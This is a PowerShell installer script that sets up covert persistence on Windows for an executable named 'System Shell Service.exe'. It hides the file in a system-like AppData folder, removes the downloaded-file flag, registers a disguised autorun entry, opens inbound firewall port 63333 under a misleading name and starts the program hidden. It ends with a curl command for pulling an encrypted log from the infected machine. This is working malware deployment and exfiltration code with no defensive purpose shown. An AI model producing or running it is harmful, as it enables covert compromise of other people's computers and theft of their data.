# install.ps1 — Windows Silent Persistence
# Place in same folder as SystemShell.exe
# Run: powershell -ep bypass -f install.ps1

$ExeName = "System Shell Service.exe"
$SrcPath = Join-Path $PSScriptRoot $ExeName
$DestDir = "$env:APPDATA\Microsoft\System"
$DestPath = "$DestDir\$ExeName"

# === 1. Validate EXE ===
if (-not (Test-Path $SrcPath)) {
    Write-Host "[ERROR] $ExeName not found in:" -ForegroundColor Red
    Write-Host "        $PSScriptRoot" -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit 1
}

# === 2. Copy to hidden system-like path ===
Write-Host "[Installing] Copying to $DestPath"
New-Item -ItemType Directory -Path $DestDir -Force | Out-Null
Copy-Item -Path $SrcPath -Destination $DestPath -Force

# === 3. Unblock file (remove "downloaded from internet" flag) ===
Unblock-File -Path $DestPath -ErrorAction SilentlyContinue

# === 4. Add to startup (HKCU Run) ===
$RunKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$RunName = 'SystemUpdateService'
Set-ItemProperty -Path $RunKey -Name $RunName -Value "`"$DestPath`"" -Force

# === 5. Open firewall port 63333 ===
netsh advfirewall firewall add rule name="System Network Service" dir=in action=allow protocol=TCP localport=63333 > $null 2>&1

# === 6. Start silently ===
Write-Host "[Installing] Starting $ExeName..."
Start-Process -FilePath $DestPath -WindowStyle Hidden

# === DONE ===
Write-Host "[SUCCESS] Persistence installed!" -ForegroundColor Green
Write-Host "[SUCCESS] Auto-runs silently on login"
Write-Host "[SUCCESS] Exfil: curl http://THIS_IP:63333 -o log.enc"
Write-Host ""
Write-Host "Press Enter to exit..."
Read-Host | Out-Null